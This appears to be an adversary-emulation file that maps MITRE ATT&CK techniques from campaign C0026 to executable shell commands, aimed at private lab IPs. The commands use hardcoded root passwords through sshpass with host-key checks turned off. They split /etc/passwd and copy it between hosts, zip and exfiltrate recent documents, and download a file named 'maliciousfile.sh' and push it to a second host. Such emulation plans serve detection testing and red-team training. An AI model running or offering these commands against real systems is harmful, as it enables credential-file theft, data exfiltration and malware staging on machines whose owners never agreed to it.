name: T1030 - Data Transfer Size Limits
description: During C0026, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.

executors.name: sh
executors.command: sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'split -b 3M /etc/passwd /tmp/passwd.part.' && sshpass -p RootPass123 scp -o StrictHostKeyChecking=no root@172.21.0.20:/tmp/passwd.part.* ./ && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'cat /tmp/passwd.part.* | sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.22.0.20 "cat > /tmp/passwd_reassembled"'

name: T1568 - Dynamic Resolution
description: During C0026, the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used by ANDROMEDA.

executors.name: sh
executors.command: host hostb.dynamic.local 172.21.0.20 && dig @172.21.0.20 hostb.dynamic.local A && nc -vz 172.21.0.20 53

name: T1560.001 - Archive via Utility
description: During C0026, the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1, 2021.

executors.name: sh
executors.command: sshpass -p Passw0rd ssh attacker@172.21.0.20 'find /home/attacker -type f -newermt 2021-01-01 ! -name archive.zip -exec zip /tmp/archive.zip {} +' && sshpass -p Passw0rd scp attacker@172.21.0.20:/tmp/archive.zip ./archive.zip

name: T1583.001 - Domains
description: For C0026, the threat actors re-registered expired C2 domains previously used for ANDROMEDA malware.

name: T1105 - Ingress Tool Transfer
description: During C0026, the threat actors downloaded malicious payloads onto select compromised hosts.

executors.name: sh
executors.command: sshpass -p RootPass123 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@172.21.0.20:/tmp/wget && sshpass -p RootPass123  ssh -o StrictHostKeyChecking=no root@172.21.0.20 'wget http://172.21.0.20/maliciousfile.sh -O /tmp/malware && sshpass -p RootPass123  scp -o StrictHostKeyChecking=no /tmp/malware root@172.22.0.20:/tmp/malware'

name: T1005 - Data from Local System
description: During C0026, the threat actors collected documents from compromised hosts.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'find /home/attacker -type f -name "*.doc" -o -name "*.docx" -o -name "*.pdf" -o -name "*.txt" -exec cat {} +'
